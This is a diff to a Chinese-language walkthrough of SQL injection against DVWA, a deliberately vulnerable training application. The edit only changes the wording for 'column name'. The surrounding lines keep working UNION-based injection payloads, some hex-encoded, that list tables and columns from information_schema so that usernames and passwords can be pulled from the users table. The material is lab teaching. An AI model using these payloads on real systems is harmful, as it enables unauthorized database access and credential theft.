@@ -79,10 +79,10 @@ if( isset( $_REQUEST[ 'Submit' ] ) ) {
 - 或者`1' union select 1,group_concat(table_name) from information_schema.tables where table_schema='dvwa'#`
 - 或者`1' union select 1,group_concat(table_name) from information_schema.tables where table_schema=0x64767761#     （0x64767761是dvwa的ascii码）`
 ![image](https://user-images.githubusercontent.com/71583369/144434141-576190e6-e805-453e-adef-d354918172fb.png)
-5. 爆出列名
+5. 爆出字段名
 - 输入`1' union select 1,group_concat(column_name) from information_schema.columns where table_name='users' and table_schema='dvwa'#`
 - 或者`1' union select 1,group_concat(column_name) from information_schema.columns where table_name=0x7573657273 and table_schema=0x64767761#`
-- 猜测用户名密码存在users表中，我们爆出users表的列
+- 猜测用户名密码存在users表中，我们爆出users表的字段
 ![image](https://user-images.githubusercontent.com/71583369/144436293-e9f15308-2edd-45ca-bfa4-72872147d354.png)
 猜测用户名和密码在user和password
 6. 查看用户名和密码
